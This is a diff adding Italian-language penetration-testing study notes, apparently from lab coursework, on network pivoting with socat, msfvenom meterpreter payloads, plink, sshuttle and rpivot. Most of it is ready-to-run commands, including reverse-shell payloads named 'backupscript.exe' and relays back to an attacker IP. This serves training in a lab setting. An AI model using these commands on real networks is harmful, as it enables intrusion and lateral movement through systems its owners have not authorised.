@@ -285,3 +285,81 @@ Metasploit puo' anche fare reverse port forwarding. quindi si ascolta su una por
 `meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`. -l e' la porta sul nostro host attaccante
 
 Poi ci mettiamo in ascolto con meterpreter
+
+
+# Socat Redirection with a Reverse Shell
+
+Socat e' un tool di relay bidirezionale che permette di creare pipe sockets tra 2 reti indipendenti senza usare SSH.
+
+Si comporta come un redirector che puo' ascoltare su un host e forwardare i dati ad un altro IP.
+
+### Starting Socat Listener
+`ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`, sul pivot server
+
+### Creare il payload
+
+`j4k1dibe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`
+
+mettersi in ascolto su 0.0.0.0
+
+# Socat Redirection con una Bind Shell
+
+Possiamo redirectre pure bind shell
+
+### Creiamo il payload
+`[!bash!]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443`
+
+### Startiamo il listener su pivot server
+`ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`
+
+
+# SSH for Windows: plink.exe
+
+Plink, che sta per (PuTTY Link) e' un tool command line parte del paccehtto PuTTY. Plink puo' essere usato per creare dynamic port forwards e SOCKS proxies.
+
+Prima del 2018 WIndows non aveva nativo SSH client, percio' molti usavano PuTTY.
+
+### Usare Plink.exe
+`plink -ssh -D 9050 ubuntu@10.129.15.50`
+
+
+Un altro tool windows-based e' Proxifier e puo' essere usato per iniziare SOCKS tunner via SSH
+
+# SSH Pivoting with Sshuttle
+**Sshuttle** e' un tool in python che rimuove la necessita' di configurare proxychains. Pero' questo tool funziona solo over SSH e non da' opzione di pivotare over TOR o HTTPS.
+
+Puo' essere molto utile per automatizzare esecuzione di iptables e aggiungere pivot rules all' host remoto.
+
+`j4k1dibe@htb[/htb]$ sudo apt-get install sshuttle`
+
+### Running sshuttle
+`j4k1dibe@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v `
+
+### Traffic routing via Ipdatbles routes
+
+`j4k1dibe@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn`
+
+
+# Web Server Pivoting with Rpivot
+
+**Rpivot** e' un tool di reverse SOCKS proxy scritto in python per SOCKS tunneling. Rpivot binda una macchina dentro una rete aziendale ad un server esterno ed espone la porta local del client server side
+
+### iNSTALLATION
+
+`j4k1dibe@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git`
+
+`j4k1dibe@htb[/htb]$ sudo apt-get install python2.7`
+
+
+### Execution
+`j4k1dibe@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` sulla macchina attaccante
+
+`j4k1dibe@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/` trasferiamo client.py sulla macchina pivot
+
+`ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`, runniamo client.py sul pivot
+
+### Browsing the target webserver con proxychahins
+`proxychains firefox-esr 172.16.5.135:80`
+
+### COnnettersi ad un webserver usando HTTP_Proxy & NTLM Auth
+`python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`
